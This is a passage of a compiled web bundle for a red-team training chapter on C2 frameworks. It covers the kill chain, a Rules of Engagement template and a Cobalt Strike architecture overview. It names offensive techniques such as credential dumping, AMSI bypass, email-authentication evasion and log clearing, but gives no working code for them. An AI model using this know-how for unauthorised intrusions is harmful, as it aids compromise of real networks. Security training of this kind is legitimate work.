"use strict";
(globalThis["webpackChunksite"] = globalThis["webpackChunksite"] || []).push([[5055],{

/***/ 25599
(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  assets: () => (/* binding */ assets),
  contentTitle: () => (/* binding */ contentTitle),
  "default": () => (/* binding */ MDXContent),
  frontMatter: () => (/* binding */ frontMatter),
  metadata: () => (/* reexport */ site_docs_courses_cyber_security_13_red_team_c_2_md_764_namespaceObject),
  toc: () => (/* binding */ toc)
});

;// ./.docusaurus/docusaurus-plugin-content-docs/default/site-docs-courses-cyber-security-13-red-team-c-2-md-764.json
const site_docs_courses_cyber_security_13_red_team_c_2_md_764_namespaceObject = /*#__PURE__*/JSON.parse('{"id":"courses/cyber-security/13-red-team-c2","title":"Chapter 13: Advanced Red Team Operations & C2 Frameworks","description":"Prereq: Chapters 10 (Pentesting), 11 (SOC Threat Hunting), 12 (Malware Analysis)","source":"@site/docs/courses/cyber-security/13-red-team-c2.md","sourceDirName":"courses/cyber-security","slug":"/cyber-security/13-red-team-c2","permalink":"/ai-engineering-journey/cyber-security/13-red-team-c2","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":12,"frontMatter":{"id":"13-red-team-c2","slug":"/cyber-security/13-red-team-c2","title":"Chapter 13: Advanced Red Team Operations & C2 Frameworks","sidebar_label":"Chapter 13: Advanced Red Team Operations & C2 Frameworks","sidebar_position":12},"sidebar":"course-cyber-security","previous":{"title":"Chapter 12: Malware Analysis & Reverse Engineering","permalink":"/ai-engineering-journey/cyber-security/12-malware-analysis"},"next":{"title":"Chapter 14: Wireless, IoT & Embedded Security","permalink":"/ai-engineering-journey/cyber-security/14-wireless-iot-embedded"}}');
// EXTERNAL MODULE: ./node_modules/react/jsx-runtime.js
var jsx_runtime = __webpack_require__(74848);
// EXTERNAL MODULE: ./node_modules/@mdx-js/react/lib/index.js
var lib = __webpack_require__(28453);
;// ./docs/courses/cyber-security/13-red-team-c2.md


const frontMatter = {
	id: '13-red-team-c2',
	slug: '/cyber-security/13-red-team-c2',
	title: 'Chapter 13: Advanced Red Team Operations & C2 Frameworks',
	sidebar_label: 'Chapter 13: Advanced Red Team Operations & C2 Frameworks',
	sidebar_position: 12
};
const contentTitle = 'Chapter 13: Advanced Red Team Operations & C2 Frameworks';

const assets = {

};



const toc = [{
  "value": "Learning Objectives",
  "id": "learning-objectives",
  "level": 2
}, {
  "value": "Chapter at a Glance",
  "id": "chapter-at-a-glance",
  "level": 2
}, {
  "value": "1. Red Team Methodology — The Full Kill Chain",
  "id": "1-red-team-methodology--the-full-kill-chain",
  "level": 2
}, {
  "value": "1.1 The Red Team Kill Chain",
  "id": "11-the-red-team-kill-chain",
  "level": 3
}, {
  "value": "1.2 Rules of Engagement (ROE) Template",
  "id": "12-rules-of-engagement-roe-template",
  "level": 3
}, {
  "value": "1.3 Engagement Lifecycle — Time Allocation",
  "id": "13-engagement-lifecycle--time-allocation",
  "level": 3
}, {
  "value": "2. C2 Frameworks — Cobalt Strike",
  "id": "2-c2-frameworks--cobalt-strike",
  "level": 2
}, {
  "value": "2.1 Architecture Overview",
  "id": "21-architecture-overview",
  "level": 3
}, {
  "value": "2.2 Malleable C2 Profiles — Deep Dive",
  "id": "22-malleable-c2-profiles--deep-dive",
  "level": 3
}, {
  "value": "2.3 Beacon Types — Staged vs Stageless",
  "id": "23-beacon-types--staged-vs-stageless",
  "level": 3
}, {
  "value": "2.4 C2 Communication Flow Diagram",
  "id": "24-c2-communication-flow-diagram",
  "level": 3
}, {
  "value": "2.5 C2 Beacon Simulator (TypeScript)",
  "id": "25-c2-beacon-simulator-typescript",
  "level": 3
}, {
  "value": "3. C2 Frameworks — Sliver",
  "id": "3-c2-frameworks--sliver",
  "level": 2
}, {
  "value": "3.1 Sliver Architecture",
  "id": "31-sliver-architecture",
  "level": 3
}, {
  "value": "3.2 Sliver C2 Setup Guide — Full Deployment",
  "id": "32-sliver-c2-setup-guide--full-deployment",
  "level": 3
}, {
  "value": "3.3 Sliver Operator Configuration (TypeScript)",
  "id": "33-sliver-operator-configuration-typescript",
  "level": 3
}, {
  "value": "3.4 Sliver Armory — Popular Packages",
  "id": "34-sliver-armory--popular-packages",
  "level": 3
}, {
  "value": "4. C2 Frameworks — Covenant",
  "id": "4-c2-frameworks--covenant",
  "level": 2
}, {
  "value": "4.1 Covenant Architecture",
  "id": "41-covenant-architecture",
  "level": 3
}, {
  "value": "4.2 Covenant Setup Guide",
  "id": "42-covenant-setup-guide",
  "level": 3
}, {
  "value": "4.3 Covenant Dynamic Task Compilation (TypeScript)",
  "id": "43-covenant-dynamic-task-compilation-typescript",
  "level": 3
}, {
  "value": "5. Phishing Operations",
  "id": "5-phishing-operations",
  "level": 2
}, {
  "value": "5.1 GoPhish Deployment",
  "id": "51-gophish-deployment",
  "level": 3
}, {
  "value": "5.2 Phishing Campaign Manager (TypeScript)",
  "id": "52-phishing-campaign-manager-typescript",
  "level": 3
}, {
  "value": "5.3 Tracking Pixel Architecture",
  "id": "53-tracking-pixel-architecture",
  "level": 3
}, {
  "value": "6. Adversary Emulation",
  "id": "6-adversary-emulation",
  "level": 2
}, {
  "value": "6.1 MITRE ATT&amp;CK Mapping",
  "id": "61-mitre-attck-mapping",
  "level": 3
}, {
  "value": "6.2 APT Emulation Procedures",
  "id": "62-apt-emulation-procedures",
  "level": 3
}, {
  "value": "7. Evasion Techniques",
  "id": "7-evasion-techniques",
  "level": 2
}, {
  "value": "7.1 AMSI Bypass",
  "id": "71-amsi-bypass",
  "level": 3
}, {
  "value": "7.2 Syscall Direct — Hell&#39;s Gate and Halo&#39;s Gate",
  "id": "72-syscall-direct--hells-gate-and-halos-gate",
  "level": 3
}, {
  "value": "7.3 Lateral Movement Kerberos Attack Chain Diagram",
  "id": "73-lateral-movement-kerberos-attack-chain-diagram",
  "level": 3
}, {
  "value": "8. Lateral Movement",
  "id": "8-lateral-movement",
  "level": 2
}, {
  "value": "8.1 Lateral Movement Methods",
  "id": "81-lateral-movement-methods",
  "level": 3
}, {
  "value": "8.2 Lateral Movement Executor (TypeScript)",
  "id": "82-lateral-movement-executor-typescript",
  "level": 3
}, {
  "value": "9. Kerberos Attacks",
  "id": "9-kerberos-attacks",
  "level": 2
}, {
  "value": "9.1 Kerberos Attack Overview",
  "id": "91-kerberos-attack-overview",
  "level": 3
}, {
  "value": "9.2 Kerberos Ticket Manipulation Library (TypeScript)",
  "id": "92-kerberos-ticket-manipulation-library-typescript",
  "level": 3
}, {
  "value": "9.3 Kerberos Attack Walkthrough",
  "id": "93-kerberos-attack-walkthrough",
  "level": 3
}, {
  "value": "10. Real Operation Case Studies",
  "id": "10-real-operation-case-studies",
  "level": 2
}, {
  "value": "10.1 SolarWinds (APT29 / Nobelium) — 2020",
  "id": "101-solarwinds-apt29--nobelium--2020",
  "level": 3
}, {
  "value": "10.2 Colonial Pipeline (DarkSide) — 2021",
  "id": "102-colonial-pipeline-darkside--2021",
  "level": 3
}, {
  "value": "Practical Takeaways",
  "id": "practical-takeaways",
  "level": 2
}, {
  "value": "Summary",
  "id": "summary",
  "level": 2
}, {
  "value": "Chapter Quiz (10 Questions)",
  "id": "chapter-quiz-10-questions",
  "level": 2
}, {
  "value": "Exercises",
  "id": "exercises",
  "level": 2
}, {
  "value": "Exercise 1: C2 Beacon Profile Design",
  "id": "exercise-1-c2-beacon-profile-design",
  "level": 3
}, {
  "value": "Exercise 2: Sliver C2 Deployment",
  "id": "exercise-2-sliver-c2-deployment",
  "level": 3
}, {
  "value": "Exercise 3: Phishing Campaign Simulation",
  "id": "exercise-3-phishing-campaign-simulation",
  "level": 3
}, {
  "value": "Exercise 4: Kerberos Attack Chain",
  "id": "exercise-4-kerberos-attack-chain",
  "level": 3
}, {
  "value": "Exercise 5: Lateral Movement Playbook",
  "id": "exercise-5-lateral-movement-playbook",
  "level": 3
}, {
  "value": "Exercise 6: Evasion Technique Implementation",
  "id": "exercise-6-evasion-technique-implementation",
  "level": 3
}, {
  "value": "Exercise 7: Red Team Engagement Report",
  "id": "exercise-7-red-team-engagement-report",
  "level": 3
}, {
  "value": "Exercise 8: APT Emulation Plan",
  "id": "exercise-8-apt-emulation-plan",
  "level": 3
}, {
  "value": "References",
  "id": "references",
  "level": 2
}];
function _createMdxContent(props) {
  const _components = {
    a: "a",
    blockquote: "blockquote",
    code: "code",
    details: "details",
    h1: "h1",
    h2: "h2",
    h3: "h3",
    header: "header",
    hr: "hr",
    li: "li",
    ol: "ol",
    p: "p",
    pre: "pre",
    strong: "strong",
    summary: "summary",
    table: "table",
    tbody: "tbody",
    td: "td",
    th: "th",
    thead: "thead",
    tr: "tr",
    ul: "ul",
    ...(0,lib/* useMDXComponents */.R)(),
    ...props.components
  };
  return (0,jsx_runtime.jsxs)(jsx_runtime.Fragment, {
    children: [(0,jsx_runtime.jsx)(_components.header, {
      children: (0,jsx_runtime.jsx)(_components.h1, {
        id: "chapter-13-advanced-red-team-operations--c2-frameworks",
        children: "Chapter 13: Advanced Red Team Operations & C2 Frameworks"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.blockquote, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Prereq:"
        }), " Chapters 10 (Pentesting), 11 (SOC Threat Hunting), 12 (Malware Analysis)\n", (0,jsx_runtime.jsx)(_components.strong, {
          children: "Target Audience:"
        }), " Red team operators, penetration testers, adversary emulation engineers, C2 developers"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "learning-objectives",
      children: "Learning Objectives"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "By the end of this chapter, you will be able to:"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Execute the full red team kill chain: Planning -> Recon -> Initial Access -> Persistence -> Lateral Movement -> Exfiltration -> Reporting."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Deploy and configure C2 frameworks — Cobalt Strike (Malleable C2 profiles, beaconing, BOFs), Sliver (mTLS/HTTP/DNS operators), and Covenant (ASP.NET, gRPC staging)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Design and execute phishing campaigns using GoPhish with SMTP relay, evaded SPF/DKIM/DMARC checks, and tracking pixel analytics."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Map adversary emulation to MITRE ATT&CK, execute Atomic Red Team tests, and simulate APT29 and APT41 TTPs."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Implement evasion techniques: AMSI bypass, ETW patching, Hell's Gate/Halo's Gate syscall direct, sandbox detection."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Generate payloads in multiple formats (shellcode, sRDI, PIC) using msfvenom, Donut, and custom TypeScript tooling."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Execute lateral movement via WMI, PsExec, DCOM, SMB exec, WinRM, Pass-the-Hash, and Overpass-the-Hash."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Perform Kerberos attacks: Kerberoasting, AS-REP roasting, Silver/Golden ticket forging, DCSync, Skeleton Key."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Build TypeScript tooling for C2 beacon simulation, Malleable C2 profile parsing, AMSI bypass generation, lateral movement orchestration, PtH simulation, Kerberos ticket manipulation, phishing campaign management, and payload generation."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "chapter-at-a-glance",
      children: "Chapter at a Glance"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Section"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Key Concept"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Why It Matters"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Red Team Methodology"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full kill chain from planning to reporting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Foundational process for every red team engagement"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "C2 Frameworks — Cobalt Strike"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malleable C2 profiles, beaconing, stageless/staged payloads, BOFs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Industry-standard C2 with unmatched customization"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "C2 Frameworks — Sliver"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Open-source, mTLS/HTTP/DNS, operator/armory ecosystem"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Free alternative with modern Go-based architecture"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "C2 Frameworks — Covenant"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ASP.NET Core, gRPC staging, dynamic compilation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Innovative .NET-based C2 with real-time UI"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Phishing Operations"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SMTP relay, GoPhish, SPF/DKIM/DMARC evasion, tracking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Primary initial access vector in 80%+ of breaches"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Adversary Emulation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MITRE ATT&CK mapping, Atomic Red Team, APT emulation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Measure detection coverage with real TTPs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Evasion Techniques"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AMSI bypass, ETW patching, syscall direct, sandbox detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Critical for operating in modern EDR/XDR environments"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Payload Generation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Shellcode, sRDI, PIC, multiple output formats"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Deliver payloads in any required format"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Lateral Movement"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "WMI, PsExec, DCOM, SMB, WinRM, PtH, Overpass-the-Hash"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Move through networks without triggering alarms"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Kerberos Attacks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kerberoasting, AS-REP, Silver/Golden, DCSync, Skeleton Key"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Compromise an entire domain with a single technique"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "1-red-team-methodology--the-full-kill-chain",
      children: "1. Red Team Methodology — The Full Kill Chain"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "11-the-red-team-kill-chain",
      children: "1.1 The Red Team Kill Chain"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A red team engagement follows a structured, iterative process modeled on real adversary operations. Unlike a standard penetration test that checks boxes, a red team engagement is objective-driven — simulate a specific threat actor against a defined target."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "                         RED TEAM KILL CHAIN\n+----------+----------+----------+----------+----------+----------+-----------+\n| PLANNING |  RECON   | INITIAL  | PERSIST  | LATERAL  |  EXFIL   | REPORTING |\n|          |          | ACCESS   |          | MOVEMENT |          |           |\n+----------+----------+----------+----------+----------+----------+-----------+\n| ROE      | OSINT    | Phishing | Backdoor | Pivoting | Data     | Executive |\n| Scope    | Passive  | Exploit  | C2       | Protocol | Staging  | Summary   |\n| CoA      | Active   | Creds    | Schedule | Hop      | Encrypt  | Findings  |\n+----------+----------+----------+----------+----------+----------+-----------+\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Phase 1 — Planning:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Define Rules of Engagement (ROE): target scope, excluded hosts, time windows, data handling"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Select adversary to emulate (e.g., APT29 for stealth operations)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Identify crown jewels and primary objectives"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Set communication protocol (callout schedule, reporting cadence)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Phase 2 — Reconnaissance:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Passive: WHOIS, DNS enumeration, Shodan, Censys, Google dorking, social media OSINT"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Active: Nmap scanning, directory brute-force, subdomain enumeration, technology fingerprinting"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Target validation: verify scope, identify active systems, build network maps"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Phase 3 — Initial Access:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Phishing: crafted emails with weaponized attachments or links"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Exploit: web application CVEs, unpatched services, SQL injection"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Credential theft: password spraying, credential stuffing, default credentials"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Supply chain: compromised dependencies, CI/CD pipeline attacks"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Phase 4 — Persistence:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "C2 beacon deployment: scheduled tasks, WMI event subscriptions, service installations"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Backdoor accounts: create local/domain users, modify ACLs, SID history injection"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Boot persistence: registry run keys, startup folder, DLL search-order hijacking"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Credential dumping: LSASS, SAM, NTDS.dit, DPAPI, browser cookies"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Phase 5 — Lateral Movement:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Pass-the-Hash (PtH), Overpass-the-Hash (OPtH), Pass-the-Ticket (PtT)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Remote execution: WMI, PsExec, WinRM, DCOM, SMB exec, Scheduled Tasks"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Remote desktop: RDP session hijacking, credential relay"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Network pivoting: SSH tunneling, SOCKS proxy, port forwarding"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Phase 6 — Exfiltration:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Data staging: collect, compress, encrypt target data"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Exfiltration channels: DNS tunneling, HTTPS, SMTP, ICMP, SMB over QUIC"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Cover tracks: clear event logs, modify timestamps, remove artifacts"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Phase 7 — Reporting:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Executive summary: business impact, risk ratings, strategic recommendations"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Technical findings: detailed TTPs, evidence, timelines, detection gaps"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Remediation roadmap: prioritized fixes with MITRE ATT&CK mappings"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "12-rules-of-engagement-roe-template",
      children: "1.2 Rules of Engagement (ROE) Template"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "// roe-contract.ts — Rules of Engagement Definition and Validation\n\ninterface RulesOfEngagement {\n  engagementId: string;\n  clientName: string;\n  startDate: Date;\n  endDate: Date;\n  scope: ScopeDefinition;\n  exclusions: Exclusion[];\n  communicationPlan: CommunicationPlan;\n  dataHandling: DataHandlingPolicy;\n  escalationPath: EscalationContact[];\n}\n\ninterface ScopeDefinition {\n  inScopeDomains: string[];\n  inScopeNetworks: string[];\n  inScopeApplications: string[];\n  inScopePersonas: string[];\n  objectiveGroups: ObjectiveGroup[];\n}\n\ninterface ObjectiveGroup {\n  name: string;\n  successCriteria: string[];\n  criticality: 'low' | 'medium' | 'high' | 'critical';\n}\n\ninterface Exclusion {\n  type: 'host' | 'network' | 'time' | 'technique' | 'person';\n  value: string;\n  reason: string;\n}\n\ninterface CommunicationPlan {\n  calloutSchedule: string;\n  emergencyStopContact: string;\n  reportingCadenceHours: number;\n  silentMode: boolean;\n}\n\ninterface DataHandlingPolicy {\n  allowScreenCapture: boolean;\n  allowCredentialHarvesting: boolean;\n  maxDataExfilMB: number;\n  dataDestruction: boolean;\n  piiHandling: 'mask' | 'avoid' | 'allowed';\n}\n\ninterface EscalationContact {\n  name: string;\n  role: string;\n  email: string;\n  phone: string;\n  priority: 1 | 2 | 3;\n}\n\nfunction validateROE(roe: RulesOfEngagement): { valid: boolean; issues: string[] } {\n  const issues: string[] = [];\n  if (roe.exclusions.length === 0) {\n    issues.push('WARNING: No exclusions defined - all systems may be targeted');\n  }\n  if (!roe.communicationPlan.emergencyStopContact) {\n    issues.push('ERROR: Emergency stop contact is required');\n  }\n  if (roe.objectiveGroups.length === 0) {\n    issues.push('ERROR: At least one objective group must be defined');\n  }\n  if (roe.dataHandling.maxDataExfilMB > 500) {\n    issues.push('WARNING: Data exfiltration >500MB may cause network disruption');\n  }\n  return { valid: issues.filter(i => i.startsWith('ERROR')).length === 0, issues };\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "13-engagement-lifecycle--time-allocation",
      children: "1.3 Engagement Lifecycle — Time Allocation"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Phase"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Typical Duration"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Deliverables"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Planning & ROE"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-2 weeks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ROE document, threat model, adversary selection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Reconnaissance"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2-5 days"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attack surface map, technology stack, user lists"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Initial Access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-7 days"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Compromised host, C2 beacon established"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Persistence & Lateral Movement"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "3-14 days"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Multiple footholds, domain compromise, crown jewel access"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Exfiltration & Cleanup"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-2 days"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data extracts, log cleanup, artifacts removed"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Reporting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "3-5 days"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Executive report, technical report, detection findings"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "2-c2-frameworks--cobalt-strike",
      children: "2. C2 Frameworks — Cobalt Strike"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "21-architecture-overview",
      children: "2.1 Architecture Overview"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Cobalt Strike is the industry-standard red team C2 framework. Its architecture revolves around a Team Server (Java-based) that operators connect to via the Cobalt Strike client, and Beacons that execute on compromised hosts."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "                 COBALT STRIKE ARCHITECTURE\n\n+----------+     +--------------+     +-------------------------+\n|Operator 1|---->|              |     |  HTTP(S) / DNS / SMB     |\n|(Client)  |     |              |     |    +----------+         |\n+----------+     | Team Server  |<===>|    | Beacon 1 |         |\n                 | (Java,50050) |     |    | (Victim) |         |\n+----------+     |              |     |    +----------+         |\n|Operator 2|---->|              |     |                         |\n|(Client)  |     | +----------+ |     |    +----------+         |\n+----------+     | |Malleable | |     |    | Beacon 2 |         |\n                 | | C2       | |     |    | (Victim) |         |\n+----------+     | | Profile  | |     |    +----------+         |\n|Aggressor |---->| +----------+ |     |                         |\n| Scripts  |     | +----------+ |     |    +----------+         |\n+----------+     | | Data     | |     |    | Pivot    |         |\n                 | | Store    | |     |    | Beacon   |         |\n                 | +----------+ |     |    +----------+         |\n                 +--------------+     +-------------------------+\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Key Components:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Team Server (port 50050): Central coordination. Operators connect over TCP; beacons over HTTP/HTTPS/DNS/SMB."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Beacon: Lightweight payload on victim. Supports sleep cycles, tasking, inline execution, module loading."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Malleable C2 Profile: XML/config defining all observable C2 traffic characteristics."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Listener: Server-side component accepting beacon callbacks (HTTP, HTTPS, DNS, SMB, TCP)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Aggressor Script: Scripting language extending Cobalt Strike with custom UI and automation."
      }), "\n"]
